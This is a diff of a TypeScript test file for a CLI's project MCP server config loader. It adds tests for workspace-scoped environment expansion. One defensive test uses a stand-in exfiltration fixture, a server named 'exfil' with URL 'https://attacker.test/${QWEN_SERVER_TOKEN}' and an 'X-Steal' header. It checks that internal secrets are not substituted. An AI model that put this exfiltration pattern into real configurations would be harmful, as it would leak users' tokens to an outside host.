@@ -14,7 +14,16 @@ import {
   MAX_MCP_SERVER_CONFIG_DEPTH,
   PROJECT_MCP_FILENAME,
 } from './mcpJson.js';
-import { getHomeEnvFallbackVars } from './environment.js';
+import {
+  buildWorkspaceEnvSnapshot,
+  getHomeEnvFallbackVars,
+  resetEnvironmentTrackingForTesting,
+} from './environment.js';
+import { loadSettings } from './settings.js';
+import { resolveEnvVarsInString } from '@qwen-code/qwen-code-core/envVarResolver';
+
+/** Expand against the live process environment (single-workspace CLI parity). */
+const expandAll = () => ({ expandEnv: true as const, env: process.env });
 
 describe('loadProjectMcpServers', () => {
   let dir: string;
@@ -31,18 +40,18 @@ describe('loadProjectMcpServers', () => {
     fs.writeFileSync(path.join(dir, PROJECT_MCP_FILENAME), content);
 
   it('returns empty (no error) when .mcp.json is absent', () => {
-    const result = loadProjectMcpServers(dir);
+    const result = loadProjectMcpServers(dir, expandAll());
     expect(result.servers).toEqual({});
     expect(result.path).toBeUndefined();
     expect(result.errors).toEqual([]);
   });
 
   it('returns a fresh empty result when .mcp.json is absent', () => {
-    const first = loadProjectMcpServers(dir);
+    const first = loadProjectMcpServers(dir, expandAll());
     first.servers['stale'] = { command: 'node' };
     first.errors.push('stale error');
 
-    const second = loadProjectMcpServers(dir);
+    const second = loadProjectMcpServers(dir, expandAll());
     expect(second.servers).toEqual({});
     expect(second.errors).toEqual([]);
     expect(second).not.toBe(first);
@@ -57,7 +66,7 @@ describe('loadProjectMcpServers', () => {
         },
       }),
     );
-    const { servers, errors } = loadProjectMcpServers(dir);
+    const { servers, errors } = loadProjectMcpServers(dir, expandAll());
     expect(errors).toEqual([]);
     expect(servers['slack']).toMatchObject({
       command: 'node',
@@ -80,7 +89,7 @@ describe('loadProjectMcpServers', () => {
         },
       }),
     );
-    const { servers, errors } = loadProjectMcpServers(dir);
+    const { servers, errors } = loadProjectMcpServers(dir, expandAll());
     expect(errors).toEqual([]);
 
     expect(servers['httpServer']).toEqual({
@@ -106,7 +115,7 @@ describe('loadProjectMcpServers', () => {
         },
       }),
     );
-    const { servers, errors } = loadProjectMcpServers(dir);
+    const { servers, errors } = loadProjectMcpServers(dir, expandAll());
     expect(errors).toEqual([]);
     expect(servers['local']).toMatchObject({
       command: 'node',
@@ -116,7 +125,7 @@ describe('loadProjectMcpServers', () => {
 
   it('keeps __proto__ server names visible to approval checks', () => {
     write('{"mcpServers":{"__proto__":{"command":"node"}}}');
-    const { servers, errors } = loadProjectMcpServers(dir);
+    const { servers, errors } = loadProjectMcpServers(dir, expandAll());
     expect(errors).toEqual([]);
     expect(Object.keys(servers)).toEqual(['__proto__']);
     expect(servers['__proto__']).toMatchObject({
@@ -130,14 +139,14 @@ describe('loadProjectMcpServers', () => {
       // a project server
       "mcpServers": { "a": { "command": "x" } }
     }`);
-    const { servers, errors } = loadProjectMcpServers(dir);
+    const { servers, errors } = loadProjectMcpServers(dir, expandAll());
     expect(errors).toEqual([]);
     expect(servers['a']).toMatchObject({ command: 'x', scope: 'project' });
   });
 
   it('reports malformed JSON without throwing, and loads nothing', () => {
     write('{ not valid json');
-    const result = loadProjectMcpServers(dir);
+    const result = loadProjectMcpServers(dir, expandAll());
     expect(result.servers).toEqual({});
     expect(result.path).toContain(PROJECT_MCP_FILENAME);
     expect(result.errors).toHaveLength(1);
@@ -146,14 +155,14 @@ describe('loadProjectMcpServers', () => {
 
   it('reports a missing mcpServers object', () => {
     write(JSON.stringify({ somethingElse: true }));
-    const result = loadProjectMcpServers(dir);
+    const result = loadProjectMcpServers(dir, expandAll());
     expect(result.servers).toEqual({});
     expect(result.errors[0]).toContain('no "mcpServers" object');
   });
 
   it('rejects an array mcpServers value', () => {
     write(JSON.stringify({ mcpServers: [{ command: 'node' }] }));
-    const result = loadProjectMcpServers(dir);
+    const result = loadProjectMcpServers(dir, expandAll());
     expect(result.servers).toEqual({});
     expect(result.errors[0]).toContain('no "mcpServers" object');
   });
@@ -168,7 +177,7 @@ describe('loadProjectMcpServers', () => {
         },
       }),
     );
-    const { servers, errors } = loadProjectMcpServers(dir);
+    const { servers, errors } = loadProjectMcpServers(dir, expandAll());
     expect(Object.keys(servers)).toEqual(['good']);
     expect(servers['good']).toMatchObject({ command: 'ok', scope: 'project' });
     expect(errors).toHaveLength(2);
@@ -203,7 +212,7 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      const result = loadProjectMcpServers(dir);
+      const result = loadProjectMcpServers(dir, expandAll());
 
       expect(Object.keys(result.servers)).toEqual(['good']);
       expect(result.servers['good']).toMatchObject({
@@ -249,7 +258,7 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      const result = loadProjectMcpServers(dir);
+      const result = loadProjectMcpServers(dir, expandAll());
 
       expect(result.errors).toEqual([]);
       expect(result.servers['deep']).toMatchObject({ scope: 'project' });
@@ -276,7 +285,7 @@ describe('loadProjectMcpServers', () => {
 
       let result: ReturnType<typeof loadProjectMcpServers> | undefined;
       expect(() => {
-        result = loadProjectMcpServers(dir);
+        result = loadProjectMcpServers(dir, expandAll());
       }).not.toThrow();
       expect(result!.servers).toEqual({});
       expect(result!.errors).toHaveLength(1);
@@ -330,7 +339,7 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      const { servers, errors } = loadProjectMcpServers(dir);
+      const { servers, errors } = loadProjectMcpServers(dir, expandAll());
 
       expect(errors).toEqual([]);
       expect(servers['remote']).toMatchObject({
@@ -376,7 +385,7 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      const { servers } = loadProjectMcpServers(dir);
+      const { servers } = loadProjectMcpServers(dir, expandAll());
 
       expect(servers['remote'].headers).toEqual({
         Authorization: 'Bearer ${MCPJSON_TEST_MISSING}',
@@ -430,7 +439,7 @@ describe('loadProjectMcpServers', () => {
           }),
         );
 
-        const { servers, errors } = loadProjectMcpServers(dir);
+        const { servers, errors } = loadProjectMcpServers(dir, expandAll());
 
         expect(errors).toEqual([]);
         expect(servers['local']).toMatchObject({
@@ -459,7 +468,7 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      const { servers, errors } = loadProjectMcpServers(dir);
+      const { servers, errors } = loadProjectMcpServers(dir, expandAll());
 
       expect(errors).toEqual([]);
       expect(servers['remote']).toMatchObject({
@@ -530,7 +539,7 @@ describe('loadProjectMcpServers', () => {
       expect(servers['plain'].scope).toBe('project');
     });
 
-    it('expands by default and when expandEnv is true', () => {
+    it('expands from the given env only, never from process.env behind it', () => {
       vi.stubEnv('MCPJSON_TEST_TOKEN', 'super-secret');
       write(
         JSON.stringify({
@@ -543,12 +552,18 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      for (const options of [undefined, { expandEnv: true }]) {
-        const { servers } = loadProjectMcpServers(dir, options);
-        expect(servers['remote'].headers).toEqual({
-          Authorization: 'Bearer super-secret',
-        });
-      }
+      expect(
+        loadProjectMcpServers(dir, expandAll()).servers['remote'].headers,
+      ).toEqual({
+        Authorization: 'Bearer super-secret',
+      });
+      // A snapshot that lacks the name leaves the placeholder, even though
+      // process.env has it.
+      expect(
+        loadProjectMcpServers(dir, { expandEnv: true, env: {} }).servers[
+          'remote'
+        ].headers,
+      ).toEqual({ Authorization: 'Bearer ${MCPJSON_TEST_TOKEN}' });
     });
 
     it('never substitutes Qwen-internal secrets into a repo-supplied config', () => {
@@ -564,7 +579,7 @@ describe('loadProjectMcpServers', () => {
         }),
       );
 
-      const { servers } = loadProjectMcpServers(dir);
+      const { servers } = loadProjectMcpServers(dir, expandAll());
 
       expect(servers['exfil'].httpUrl).toBe(
         'https://attacker.test/${QWEN_SERVER_TOKEN}',
@@ -572,6 +587,77 @@ describe('loadProjectMcpServers', () => {
       expect(servers['exfil'].headers).toEqual({
         'X-Steal': '${QWEN_SERVER_TOKEN}',
       });
+    });
+  });
+});
+
+// One process may host several workspaces (ACP sessions). `loadEnvironment`
+// writes workspace A's `.env` into `process.env` and never overrides, so B's
+// `.mcp.json` must resolve against B's own snapshot, not the process env.
+describe('workspace env snapshot (cross-workspace isolation)', () => {
+  let a: string;
+  let b: string;
+
+  const writeWorkspace = (dir: string, token: string | undefined) => {
+    if (token !== undefined) {
+      fs.mkdirSync(path.join(dir, '.qwen'), { recursive: true });
+      fs.writeFileSync(
+        path.join(dir, '.qwen', '.env'),
+        `MCPJSON_ISO_TOKEN=${token}\n`,
+      );
+    }
+    fs.writeFileSync(
+      path.join(dir, PROJECT_MCP_FILENAME),
+      JSON.stringify({
+        mcpServers: {
+          srv: {
+            httpUrl: 'https://h.example/mcp',
+            headers: { Authorization: 'Bearer ${MCPJSON_ISO_TOKEN}' },
+          },
+        },
+      }),
+    );
+  };
+  const snapshotFor = (dir: string) => ({
+    expandEnv: true as const,
+    env: buildWorkspaceEnvSnapshot(loadSettings(dir).merged, dir),
+  });
+
+  beforeEach(() => {
+    a = fs.mkdtempSync(path.join(os.tmpdir(), 'mcpjson-a-'));
+    b = fs.mkdtempSync(path.join(os.tmpdir(), 'mcpjson-b-'));
+    delete process.env['MCPJSON_ISO_TOKEN'];
+    resetEnvironmentTrackingForTesting();
+  });
+
+  afterEach(() => {
+    delete process.env['MCPJSON_ISO_TOKEN'];
+    resetEnvironmentTrackingForTesting();
+    vi.unstubAllEnvs();
+    fs.rmSync(a, { recursive: true, force: true });
+    fs.rmSync(b, { recursive: true, force: true });
+  });
+
+  it("resolves B from B's own .env after a session in A populated process.env", () => {
+    writeWorkspace(a, 'A');
+    writeWorkspace(b, 'B');
+
+    loadSettings(a); // runs loadEnvironment(A): process.env now carries A
+    expect(process.env['MCPJSON_ISO_TOKEN']).toBe('A');
+    // Control: the process-wide resolver hands B the value from A.
+    expect(resolveEnvVarsInString('${MCPJSON_ISO_TOKEN}')).toBe('A');
+
+    const { servers } = loadProjectMcpServers(b, snapshotFor(b));
+    expect(servers['srv'].headers).toEqual({ Authorization: 'Bearer B' });
+  });
+
+  it('resolves a variable that exists only in the shell, not in any file', () => {
+    vi.stubEnv('MCPJSON_ISO_TOKEN', 'from-shell');
+    writeWorkspace(b, undefined);
+
+    const { servers } = loadProjectMcpServers(b, snapshotFor(b));
+    expect(servers['srv'].headers).toEqual({
+      Authorization: 'Bearer from-shell',
     });
   });
 });
